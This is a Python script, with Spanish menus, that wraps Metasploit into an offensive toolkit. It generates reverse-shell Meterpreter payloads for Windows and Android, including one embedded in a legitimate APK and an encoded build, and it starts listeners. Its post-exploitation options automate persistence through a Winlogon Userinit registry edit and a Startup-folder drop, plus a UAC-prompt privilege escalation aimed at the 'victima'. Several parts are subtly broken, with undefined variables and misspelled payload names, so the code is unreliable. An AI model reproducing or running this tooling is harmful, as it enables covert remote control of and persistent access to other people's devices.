import os
import ipaddress 
import binascii
import time
import pyautogui


path = os.getcwd()+ '/payloads/'
path_post = os.getcwd()+ '/post/'
path_post_sh = os.getcwd()+ '/post/android_pers.sh'
path_sh = 'android?pers.sh'
new = path_post.replace("/", "-")
path_pers_win = os.getcwd()+ '/pers_win/'

def clearScr():
    os.system('clear')



clearScr()
numero = int(input("""
    1: WIFI (Comands)
    2: Create payload 
    3: Listener
    4: Post-explotacion /ejecutar dentro de metasploit //msfconsole//

    Escoge una opcion: """))


if numero == 1:

    clearScr()
    
    anumero = int(input("""
        1: Listar IP
        2: Listar tarjetas de red
        3: Cambiar IP (tarjeta de red)


        Escoge una opcion: """))

    if anumero == 1:
        os.system ('ifconfig')

    if anumero == 2:
        os.system ('iwconfig')

    if anumero == 3:
        ip = input("""


        INTRODUZCA LA NUEVA IP 

        >  """)

        red = input("""


        INTRODUZCA EL NOMBRE DE LA TARJETA DE RED {ex: eth0, wlan0, enp0s8}

        >  """)
        os.system('ifconfig '+ red +' '+ ip +'')


elif numero == 2:

    clearScr()
    bnumero = int(input("""
        1: payload Windows /meterpreter/reverse_tcp ".exe"                       

        2: payload Android /meterpreter/reverse_tcp ".apk"

        3: payload Windows con encoder /shakata_ga_nai/ 

        4: payload Windows /oculto en pdf/ "Windows xp"

        5: payload Android /APK original/
        
        6: paylaod Windows binario /powershell/ ".vbs"

        7: payload windows ".bat"

	99: Exit


        escoge una opcion: """))


    if bnumero == 1:

        puerto = input("""

        Escoja un puerto {ex: 4444} > """)
       	
        windows_ip = input(""" 

        INTRODUZCA SU IP >  """)
        
        clearScr()

        windows_name = input( """

		INTRODUZCA EL NOMBRE DEL ARCHIVO {no se olvide de poner .exe al final del nombre} >  

	    >  """)

        clearScr()

        print ("""

        CREANDO PAYLOAD ...""")
        os.system ('msfvenom -p windows/meterpreter/reverse_tcp LHOST='+ windows_ip +' LPORT='+ puerto +' -f exe -o '+ path +''+ windows_name +'')
        
        time.sleep(2)

        clearScr()

        print ("""

        PREPARANDO EL LISTENER ...""")


        texto= "use exploit/multi/handler\n"\
                "set PAYLOAD windows/meterpreter/reverse_tcp\n"\
                "set LHOST " + windows_ip +"\n"\
                "set LPORT "+ puerto +"\n"\
                "exploit"

        with open('windows2.rc', 'w') as f:
            f.write(texto)
        os.system ('msfconsole -r windows2.rc')

    if bnumero == 2:
        clearScr()

        puerto = input("""

        Escoja un puerto {ex: 4444} >  """)        

        clearScr()

        android_ip = input("""

        INTRODUZCA SU IP >  """)

        clearScr()

        android_name = input("""

        INTRODUZCA EL NOMBRE DE LA APK {no se olvide de poner el .apk al final del nombre} >

        >  """)

        clearScr()

        print ("""
        CREANDO PAYLOAD ...""")
        
        os.system('msfvenom -p android/meterpreter/reverse_tcp LHOST'+ android_ip +'LPORT='+ puerto +' R> '+ path +''+ android_name +'')
        
        clearScr()
        
        print ("""
        PREPARANDO LISTENER ...""")
        texto1= "use exploit/multi/handler\n"\
                "set PAYLOAD android/meterpreter/reverse_tcp\n"\
                "set LHOST " + android_ip +"\n"\
                "set LPORT "+ puerto +"\n"\
                "exploit"

        with open('android.rc', 'w') as f:
            f.write(texto1)
        os.system ('msfconsole -r android.rc')
       
    if bnumero == 3:

        clearScr()
    	
        puerto = input("""

        Escoja un puerto {ex: 4444} >  """)

        clearScr()
        windows_ip = input(""" 


        INTRODUZCA SU IP >  """)
        
        clearScr()

        windows_name = input( """


        INTRODUZCA EL NOMBRE DEL ARCHIVO {no se olvide de poner .exe al final del nombre} >  

        >  """)

        clearScr()

        print ("""

        CREANDO PAYLOAD ...""")
        os.system ('msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 4 LHOST='+ windows_ip +' LPORT='+ puerto +' -f exe -o '+ path +''+ windows_name +'')
        
        time.sleep(1)

        clearScr()

        print ("""

        PREPARANDO EL LISTENER ...""")


        texto2= "use exploit/multi/handler\n"\
                "set PAYLOAD windows/meterpreter/reverse_tcp\n"\
                "set LHOST " + windows_ip +"\n"\
                "set LPORT "+ puerto +"\n"\
                "exploit"

        with open('windows2.rc', 'w') as f:
            f.write(texto2)
        os.system ('msfconsole -r windows2.rc')

     
    if bnumero == 4:

        os.system('python3 pdf.py')

     
    if bnumero == 5:
        
        clearScr()

        puerto = input("""

        Escoja un puerto {ex: 4444} >  """)

        clearScr()

        windows_ip = input("""

        Escriba su IP >  """)

        clearScr()

        apkoriginal = input("""

        Escriba la ruta de el apk original para incrustar el malware

        >  """)

        clearScr()

        windows_name = input(""" 

        Escriba el nombre del archivo, recuerda poner .apk al final del nombre

        >  """)
        
        os.system('msfvenom -x '+ apkoriginal +' -p androdi/meterpreter/reverse_tcp LHOST='+ windows_ip +' LPORT='+ puerto +' -o '+ path +''+ windows_name +'')
    



    if bnumero == 6:
   
       os.system('python3 vbs.py')



    if bnumero == 7:

       path = os.getcwd()+ '/payloads/'
	   		
       windows_ip = input("""

       Introduzca su IP 
       >  """)
	   
       puerto = input("""

	   Introduzca un puerto [ex:4444]
			 
	   >  """)


       windows_name = input("""

       Introduzca el nombre del archivo, NO SE OLVIDE de la extensio .bat al final del nombre.

  	   >  """)

       os.system('msfvenom -p cmd/windows/reverse_powershell LHOST='+ windows_ip +' LPORT='+ puerto +' > '+ path +''+ windows_name +'')


       textobat = "use exploit/multi/handler\n"\
				  "set LPORT "+ puerto +"\n"\
			  	  "set LHOST "+ windows_ip +"\n"\
				  "set PAYLOAD cmd/windows/reverse_powershell\n"\
			      "run"

       with open("textobat.rc", "w") as f:
           f.write(textobat)
       os.system('msfconsole -r textobat.rc')

	   
    if bnumero == 99:
       os.system('exit')

if numero == 3:
   clearScr() 
   listen = int(input("""
	 
1: Listener Metasploit
2: Listener Netcat

    >   """))
	 

   if listen == 1:
      clearScr() 
      windows_ip = input("""
      
      Introduzca su IP
    
        >  """)
      clearScr()
      puerto = input("""
      
      Introduzca el puerto de escucha

        >  """)

      clearScr()
      payload = input("""
      
      Payload utilizado: 
      
      Escriba... 
      
      {android} Payload de android .apk
         or
      {windows} Payload de windows .exe

      >  """)

      clearScr()
      print("Abriendo listener, este proceso puede demorar unos segundos ...")
      texto7 = "use exploit/multi/handler\n"\
               "set LPORT "+ puerto +"\n"\
               "set LHOST "+ windows_ip +"\n"\
               "set PAYLOAD "+ payload +"/meterpreter/reverse_tcp\n"\
               "run"


      with open("msflistener.rc", "w") as f:
          f.write(texto7)
      os.system('msfconsole -r msflistener.rc')


   if listen == 2:
      
      clearScr()
      puerto = input("""

      Introduzca el puerto de escucha 

      >  """)
      
      clearScr()
      print("Netcat está a la escucha el el puerto "+ puerto +"")
      os.system('nc -lvp '+ puerto +'')
	 
	 
if numero == 4:
   clearScr()
   yes = input("""
   Estas ejecutando la opcion 4 dentro de metasploit, 
   con una sesion meterpreter en {background}? [y/n] y=yes n=no

     >  """)
   if yes == "y":
      cnumero = int(input("""

      1: Persistencia Android
      2: Escalada_privilegios Windows /module/ask/
      3: Persistencia Windows /system32/admin/
      4: Persistencia Windows /win_directory/startup/
      5:

        >   """))

      if cnumero == 1:
         clearScr()         
         sleep = input("""

         Tiempo de espera entre cada peticion de conexion {recomended: 10} segundos.
    
                >  """)

         clearScr()
         texto8 = "#!/bin/bash\n"\
                  "while true\n"\
                  "do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity\n"\
                  "sleep "+ sleep +"\n"\
                  "done\n"\

         with open(""+ path_post +"android_pers.sh", "w") as f:
             f.write(texto8)

         sessions = input("""

         Indique el numero de session meterpreter

              >  """)
         clearScr()
         print("No cierre la terminal por favor :)")

          
         time.sleep(1)
         pyautogui.write("sessions " + sessions +"")
         pyautogui.press("ENTER")
         pyautogui.PAUSE = 0.2
         pyautogui.write("upload "+ new +""+ path_sh +"")
         pyautogui.press("ENTER")
         pyautogui.PAUSE = 0.2
         pyautogui.write("shell")
         pyautogui.press("ENTER")
         pyautogui.PAUSE = 0.2
         pyautogui.write("cd -")
         pyautogui.press("ENTER")
         pyautogui.PAUSE = 0.2
         pyautogui.write("cd -sdcard-Download")
         pyautogui.press("ENTER")
         pyautogui.PAUSE = 0.2
         pyautogui.write("sh android?pers.sh")
         pyautogui.press("ENTER")
            
    
      if cnumero == 2: 
       
         sessions = input("""
  
         escriba la session meterpreter

         >  """)

       

         def auto_ask():
             pyautogui.write("use exploit-windows-local-ask")
             pyautogui.press("ENTER")
             pyautogui.write("set sessions "+ sessions +"")
             pyautogui.press("ENTER")
             pyautogui.write("exploit")
             pyautogui.press("ENTER")
             clearScr()
             print("Espere a que la victima acepte la ventana flotante")
             auto_ask()    

      if cnumero == 3:
   
         sessions = input("""
  
         escriba la session meterpreter

         >  """)
   
   
         windows_ip = input("""
   
         Introduzca su IP
     
         >  """)
    
         puerto = input("""

         Introduzca un puerto {ex: 4444}
     
         >   """)
   
   
         os.system('msfvenom -p windows/meterpreter/reverse_tcp LHOST='+ windows_ip +' LPORT='+ puerto +' -f exe -o path_pers_win/persistencia.exe')  
   
         def auto_pers_sys32():
             pyautogui.write("set sessions " + sessions +"")
             pyautogui.press("ENTER")
             pyautogui.write("cd -windows-system32")
             pyautogui.press("ENTER")
             pyautogui.write("upload "+ path_payload_pers +"")
             pyautogui.press("ENTER")
             pyautogui.write("shell")
             pyautogui.press("ENTER")
             pyautogui.write("reg add \"HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" -v Userinit -d \"Userinit.exe, persistencia.exe\" -f")
             clearScr()
             print('Ahora cuando la vicima reinicie o encienda el dispositivo obtendrá una sesion meterpreter /administrador/')
             print("DESPLIEGA UN LISTENER A LA PERSISTENCIA POR EL PUERTO "+ puerto +", [solamente puede conectarse a la persistencia por dico pueto]")

         auto_pers_sys32()

      if cnumero == 4:

         windows_ip = input("""
   
         Introduzca su IP
   
         >  """)
    
         puerto = input("""
  
         Introduzca un puerto {ex: 4444}
   
         >   """)
   
       
         os.system('msfvenom -p windows/meterpreter/reverse_tcp LHOST='+ windows_ip +' LPORT='+ puerto +' -f exe -o path_payloads/persistencia.exe')
   
         def auto_pers_startup():
                       
             pyautogui.write("sessions " + sessions +"")
             pyautogui.press("ENTER")
             print(""" COPIE ESTE COMANDO PARA SEGUIR CON EL PROCESO 
                   > cd C:\Users\practicas.ist\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
		   """)
             
             
             pyautogui.write("upload " + path_payload_pers +"")
             print("CADA VEZ QUE EL USUARIO INICIE SESION RECIBIRÁ UNA SESION METERPRETER")
             print("""
       
             PUEDE DESPLEGAR UN LISTENER EN EL PUERTO "+ puerto +", {la persistencia se conecta por dicho puerto} """)
      
      
         auto_pers_startup()
      
      
          
	 
	 
	 
	 
